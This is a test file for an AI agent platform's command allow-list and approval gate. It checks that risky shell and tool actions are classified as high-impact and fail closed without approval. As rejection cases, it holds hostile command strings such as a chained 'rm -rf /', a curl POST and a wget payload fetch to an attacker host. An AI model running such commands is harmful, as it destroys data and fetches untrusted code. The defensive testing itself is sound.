import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { isReadOnlyCommand, toolRegistryBridge } from '../domains/localWorker/toolRegistryBridge.js';
import { localWorkerManager } from '../domains/localWorker/localWorkerManager.js';
import { localWorkerStore } from '../domains/localWorker/localWorkerStore.js';

describe('SEC-04: High-Impact Command Allow-list and Approval Gate', () => {
  const originalEnv = process.env.AGENTICOS_AUTH_TEST_BYPASS;

  beforeEach(() => {
    delete process.env.AGENTICOS_AUTH_TEST_BYPASS;
  });

  afterEach(() => {
    if (originalEnv !== undefined) {
      process.env.AGENTICOS_AUTH_TEST_BYPASS = originalEnv;
    } else {
      delete process.env.AGENTICOS_AUTH_TEST_BYPASS;
    }
  });

  describe('isReadOnlyCommand allow-list', () => {
    it('allows standard version and diagnostic commands', () => {
      expect(isReadOnlyCommand('node -v')).toBe(true);
      expect(isReadOnlyCommand('node --version')).toBe(true);
      expect(isReadOnlyCommand('npm -v')).toBe(true);
      expect(isReadOnlyCommand('python -v')).toBe(true);
      expect(isReadOnlyCommand('python3 --version')).toBe(true);
      expect(isReadOnlyCommand('git -v')).toBe(true);
      expect(isReadOnlyCommand('git --version')).toBe(true);
    });

    it('allows safe informational utilities', () => {
      expect(isReadOnlyCommand('whoami')).toBe(true);
      expect(isReadOnlyCommand('hostname')).toBe(true);
      expect(isReadOnlyCommand('pwd')).toBe(true);
      expect(isReadOnlyCommand('uname')).toBe(true);
      expect(isReadOnlyCommand('which node')).toBe(true);
      expect(isReadOnlyCommand('where git')).toBe(true);
    });

    it('allows directory and file inspection commands without redirection', () => {
      expect(isReadOnlyCommand('dir')).toBe(true);
      expect(isReadOnlyCommand('ls -la')).toBe(true);
      expect(isReadOnlyCommand('Get-ChildItem -Path src')).toBe(true);
      expect(isReadOnlyCommand('gci')).toBe(true);
      expect(isReadOnlyCommand('cat package.json')).toBe(true);
      expect(isReadOnlyCommand('type README.md')).toBe(true);
      expect(isReadOnlyCommand('Get-Content server.log')).toBe(true);
      expect(isReadOnlyCommand('head -n 20 file.txt')).toBe(true);
      expect(isReadOnlyCommand('tail -f app.log')).toBe(true);
    });

    it('allows process inspection and echo', () => {
      expect(isReadOnlyCommand('tasklist')).toBe(true);
      expect(isReadOnlyCommand('ps')).toBe(true);
      expect(isReadOnlyCommand('Get-Process')).toBe(true);
      expect(isReadOnlyCommand('echo Hello world')).toBe(true);
    });

    it('allows read-only git operations', () => {
      expect(isReadOnlyCommand('git status')).toBe(true);
      expect(isReadOnlyCommand('git diff')).toBe(true);
      expect(isReadOnlyCommand('git diff HEAD~1')).toBe(true);
      expect(isReadOnlyCommand('git log -n 5')).toBe(true);
      expect(isReadOnlyCommand('git show HEAD')).toBe(true);
      expect(isReadOnlyCommand('git rev-parse HEAD')).toBe(true);
      expect(isReadOnlyCommand('git describe --tags')).toBe(true);
      expect(isReadOnlyCommand('git branch')).toBe(true);
      expect(isReadOnlyCommand('git remote')).toBe(true);
      expect(isReadOnlyCommand('git remote -v')).toBe(true);
    });

    it('rejects mutating git operations', () => {
      expect(isReadOnlyCommand('git push origin main')).toBe(false);
      expect(isReadOnlyCommand('git pull')).toBe(false);
      expect(isReadOnlyCommand('git commit -m "test"')).toBe(false);
      expect(isReadOnlyCommand('git checkout other')).toBe(false);
      expect(isReadOnlyCommand('git reset --hard HEAD~1')).toBe(false);
      expect(isReadOnlyCommand('git rebase main')).toBe(false);
      expect(isReadOnlyCommand('git branch -d feature')).toBe(false);
      expect(isReadOnlyCommand('git branch -D feature')).toBe(false);
      expect(isReadOnlyCommand('git branch -m old new')).toBe(false);
      expect(isReadOnlyCommand('git clean -fd')).toBe(false);
    });

    it('rejects destructive filesystem commands', () => {
      expect(isReadOnlyCommand('rm file.txt')).toBe(false);
      expect(isReadOnlyCommand('rm -rf node_modules')).toBe(false);
      expect(isReadOnlyCommand('del secrets.env')).toBe(false);
      expect(isReadOnlyCommand('rmdir /s /q temp')).toBe(false);
      expect(isReadOnlyCommand('Remove-Item -Recurse build')).toBe(false);
      expect(isReadOnlyCommand('erase file.txt')).toBe(false);
    });

    it('rejects shell redirection and piping operators', () => {
      expect(isReadOnlyCommand('dir > output.txt')).toBe(false);
      expect(isReadOnlyCommand('echo secret >> passwords.txt')).toBe(false);
      expect(isReadOnlyCommand('cat file.txt | Out-File out.txt')).toBe(false);
      expect(isReadOnlyCommand('dir < input.txt')).toBe(false);
    });

    it('rejects command separators and chaining', () => {
      expect(isReadOnlyCommand('git status; rm -rf /')).toBe(false);
      expect(isReadOnlyCommand('ls && npm install')).toBe(false);
      expect(isReadOnlyCommand('echo hi || echo bye')).toBe(false);
      expect(isReadOnlyCommand('dir & del foo')).toBe(false);
      expect(isReadOnlyCommand("echo foo\nrm bar")).toBe(false);
      expect(isReadOnlyCommand("echo foo\r\nrm bar")).toBe(false);
    });

    it('rejects subshells, command substitution, and variable expansion', () => {
      expect(isReadOnlyCommand('echo $(whoami)')).toBe(false);
      expect(isReadOnlyCommand('echo `hostname`')).toBe(false);
      expect(isReadOnlyCommand('echo $ENV_SECRET')).toBe(false);
    });

    it('rejects process termination and network execution', () => {
      expect(isReadOnlyCommand('taskkill /F /PID 1234')).toBe(false);
      expect(isReadOnlyCommand('kill -9 1234')).toBe(false);
      expect(isReadOnlyCommand('curl -X POST http://attacker.com')).toBe(false);
      expect(isReadOnlyCommand('wget http://attacker.com/payload.sh')).toBe(false);
    });
  });

  describe('toolRegistryBridge.getRiskLevel', () => {
    it('classifies read-only inspection tools as read', () => {
      expect(toolRegistryBridge.getRiskLevel('filesystem.locate', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('filesystem.list', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('filesystem.read', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('desktop.inspect_process', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('git.status', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('git.diff', {})).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('browser.inspect', {})).toBe('read');
    });

    it('classifies allowlisted shell commands as read', () => {
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'git status' })).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'dir' })).toBe('read');
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'node -v' })).toBe('read');
    });

    it('classifies non-allowlisted shell commands as high_impact', () => {
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'git push' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'rm file.txt' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'echo x > file.txt' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('shell.execute', { command: 'curl http://example.com' })).toBe('high_impact');
    });

    it('classifies modifying tools as high_impact', () => {
      expect(toolRegistryBridge.getRiskLevel('filesystem.write', { path: 'a.txt' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('filesystem.delete', { path: 'a.txt' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('filesystem.create_folder', { path: 'newdir' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('desktop.open_app', { appName: 'notepad' })).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('developer.build', {})).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('developer.run_tests', {})).toBe('high_impact');
      expect(toolRegistryBridge.getRiskLevel('browser.navigate', { url: 'https://example.com' })).toBe('high_impact');
    });

    it('classifies unknown tools as high_impact', () => {
      expect(toolRegistryBridge.getRiskLevel('custom.unknown_tool', {})).toBe('high_impact');
    });
  });

  describe('toolRegistryBridge.executeTool approval gate', () => {
    it('fails closed with APPROVAL_ISSUER_UNAVAILABLE for high_impact tools when bypass is unset', async () => {
      delete process.env.AGENTICOS_AUTH_TEST_BYPASS;
      const res = await toolRegistryBridge.executeTool('filesystem.write', { path: 'test.txt', content: 'data' });
      expect(res.success).toBe(false);
      expect(res.error).toBe('APPROVAL_ISSUER_UNAVAILABLE');
      expect(res.output).toContain('APPROVAL_ISSUER_UNAVAILABLE');
    });

    it('fails closed with APPROVAL_ISSUER_UNAVAILABLE for non-allowlisted shell commands', async () => {
      delete process.env.AGENTICOS_AUTH_TEST_BYPASS;
      const res = await toolRegistryBridge.executeTool('shell.execute', { command: 'echo "danger" > test.txt' });
      expect(res.success).toBe(false);
      expect(res.error).toBe('APPROVAL_ISSUER_UNAVAILABLE');
    });
  });

  describe('localWorkerManager approval and autoApprove invariant', () => {
    it('fails closed when task includes high_impact step even if autoApprove is true', async () => {
      delete process.env.AGENTICOS_AUTH_TEST_BYPASS;

      // Start task with autoApprove: true but plan containing high_impact action
      const task = await localWorkerManager.startTask('Mutating task', {
        autoApprove: true,
      });

      // Manually replace plan with a high_impact step
      task.plan = [
        {
          id: 'step-danger-1',
          description: 'Write file outside approval',
          tool: 'filesystem.write',
          arguments: { path: 'hacked.txt', content: 'test' },
          status: 'pending',
          attempts: 0,
        },
      ];
      task.currentStep = 0;
      task.status = 'running';
      localWorkerStore.saveTask(task);

      // Trigger the execution loop directly
      await (localWorkerManager as any).runTaskLoop(task.id);

      const updated = localWorkerManager.getTask(task.id);
      expect(updated).toBeDefined();
      expect(updated?.status).toBe('blocked');
      expect(updated?.error).toBe('APPROVAL_ISSUER_UNAVAILABLE');
      expect(updated?.plan[0].status).toBe('failed');
      expect(updated?.plan[0].error).toContain('APPROVAL_ISSUER_UNAVAILABLE');
    });

    it('rejects plain approveTask call without test bypass', async () => {
      delete process.env.AGENTICOS_AUTH_TEST_BYPASS;

      const task = await localWorkerManager.startTask('Pending approval task', {});
      task.status = 'awaiting_approval';
      localWorkerStore.saveTask(task);

      const approved = localWorkerManager.approveTask(task.id);
      expect(approved).toBe(false);

      const updated = localWorkerManager.getTask(task.id);
      expect(updated?.status).toBe('awaiting_approval');
    });
  });
});
